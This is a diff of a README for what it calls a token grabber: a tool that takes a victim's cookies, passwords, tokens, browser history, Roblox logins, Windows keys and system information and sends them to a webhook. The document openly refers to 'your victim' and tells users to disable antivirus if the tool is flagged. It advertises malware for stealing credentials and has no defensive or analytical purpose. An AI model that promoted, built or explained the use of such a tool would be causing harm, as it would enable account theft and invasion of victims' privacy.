@@ -1,10 +1,6 @@
 # Update
 Fixed/Remade
 
-# Token Grabber
-This is a simple chrome cookie grabber. When your victim clicks on a link their cookies, passwords, tokens, browser history, and more.
-They are allsent to a webhook. It also comes with a download link.
-
 # Download
 
 It shouldn't be flagged by your antivirus but if it is just disable it.
@@ -19,6 +15,18 @@ How to use
 5. That is the simplified version and it should load quicker but you won't get as many features.
 
 Check your files in the same directory for a python script that you can convert to exe.
+
+# Features
+
+- History
+- Passwords
+- Tokens
+- Cookies
+- Emails
+- IP Adresses
+- Roblox Login Information
+- Windows Key Stealer
+- Computer Information
 
 # Disclaimer
 
